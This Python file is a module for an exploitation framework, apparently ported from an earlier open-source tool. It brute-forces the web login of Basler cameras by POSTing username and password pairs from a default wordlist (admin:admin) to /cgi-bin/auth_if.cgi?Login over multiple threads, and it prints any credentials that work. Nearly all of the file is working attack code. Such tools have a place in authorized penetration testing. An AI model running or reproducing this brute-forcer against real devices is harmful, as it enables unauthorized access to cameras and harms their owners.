# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Basler Camera — Default Web Interface Credentials (HTTP Form).

    Performs dictionary attack against the Basler camera login form via
    the /cgi-bin/auth_if.cgi?Login endpoint.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Basler Camera Default Web Interface Creds - HTTP Form",
        "description": (
            "Module performs dictionary attack against Basler Camera Web Interface. "
            "If valid credentials are found, they are displayed to the user."
        ),
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",
            "André Henrique (@mrhenrike) — EmbedXPL-Forge port",
        ),
        "devices": (
            "Basler Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self) -> None:
        self.credentials = []
        self.attack()

    @multi
    def attack(self) -> None:
        if not self.check():
            return
        print_status("Starting default creds attack against Basler Camera web interface")
        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)
        if self.credentials:
            print_success("Credentials found!")
            print_table(("Target", "Port", "Service", "Login", "Password"), *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, creds):
        while running.is_set():
            try:
                username, password = creds.next().split(":", 1)
                response = self.http_request(
                    method="POST",
                    path="/cgi-bin/auth_if.cgi?Login",
                    data={"Auth.Username": username, "Auth.Password": password},
                )
                if response and "success: true" in response.text:
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    if self.stop_on_success:
                        running.clear()
            except StopIteration:
                break

    @mute
    def check(self) -> bool:
        response = self.http_request(
            method="POST",
            path="/cgi-bin/auth_if.cgi?Login",
            data={"Auth.Username": "", "Auth.Password": ""},
        )
        if response and "success: " in response.text:
            return True
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []
            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)
            if self.credentials:
                return self.credentials
        return None
